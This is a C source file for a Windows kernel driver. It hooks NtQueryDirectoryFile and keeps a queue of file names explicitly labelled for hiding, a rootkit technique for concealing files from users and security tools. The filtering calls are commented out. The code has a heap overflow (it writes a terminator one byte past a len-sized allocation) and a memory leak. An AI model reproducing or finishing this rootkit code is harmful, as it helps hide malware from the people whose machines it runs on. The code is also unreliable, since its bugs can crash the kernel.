#include "file.h"

NTSTATUS NTAPI HookNtQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
) {
	NTSTATUS retStatus;
	PCHAR listDirBuffer;
	ULONG_PTR newListDirLength;

	retStatus = glRealNtQueryDirectoryFile(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);

	if (NT_SUCCESS(retStatus)) {
		__try {
			switch (FileInformationClass) {
			case FileDirectoryInformation:
				KdPrint(("FileDirectoryInformation\n"));
				//FILTER_LIST_DIR(FILE_DIRECTORY_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileFullDirectoryInformation:
				KdPrint(("FileFullDirectoryInformation\n"));
				//FILTER_LIST_DIR(FILE_FULL_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileBothDirectoryInformation:
				KdPrint(("FileBothDirectoryInformation\n"));
				//FILTER_LIST_DIR(FILE_BOTH_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileNamesInformation:
				KdPrint(("FileNamesInformation\n"));
				//FILTER_LIST_DIR(FILE_NAMES_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileIdBothDirectoryInformation:
				KdPrint(("FileIdBothDirectoryInformation\n"));
				//FILTER_LIST_DIR(FILE_ID_BOTH_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			case FileIdFullDirectoryInformation:
				KdPrint(("FileIdFullDirectoryInformation\n"));
				//FILTER_LIST_DIR(FILE_ID_FULL_DIR_INFORMATION, listDirBuffer, IoStatusBlock->Information, newListDirLength);
				break;
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
		}
	}

	return retStatus;
}

ULONG StrLenFilename(PCHAR str) {
	ULONG i = 0;
	while (str[i] != '\0') { i++; };
	return i;
}

VOID TaskQueueByFilename(PCHAR filename) {
	if (filename != NULL) {
		PTASK_QUEUE_FILE task = (PTASK_QUEUE_FILE)ExAllocateFromPagedLookasideList(&glPagedTaskQueueFile);

		ULONG len = StrLenFilename(filename);
		task->filename = ExAllocatePoolWithTag(PagedPool, len, 'enoN');
		RtlCopyMemory(task->filename, filename, len);
		task->filename[len] = '\0';

		InsertTailList(&glTaskQueueFile, &task->link);
	}
}

VOID FreeListQueueFilename() {

	while (!IsListEmpty(&glTaskQueueFile)) {
		PLIST_ENTRY pLink = RemoveHeadList(&glTaskQueueFile);
		PTASK_QUEUE_FILE task = CONTAINING_RECORD(pLink, TASK_QUEUE_FILE, link);
		if (task->filename) ExFreePool(task->filename);
		//ExFreeToPagedLookasideList(&glPagedTaskQueue, task);
	}

}

VOID PrintTaskQueueFileList() {
	PLIST_ENTRY pLink;
	DbgPrint("TASK QUEUE FOR HIDE FILES\n");
	for (pLink = glTaskQueueFile.Flink; pLink != &glTaskQueueFile; pLink = pLink->Flink) {
		PTASK_QUEUE_FILE task = CONTAINING_RECORD(pLink, TASK_QUEUE_FILE, link);

		if (task->filename) {
			DbgPrint("NAME:%s\n", (PCHAR)task->filename);
		}
	}
}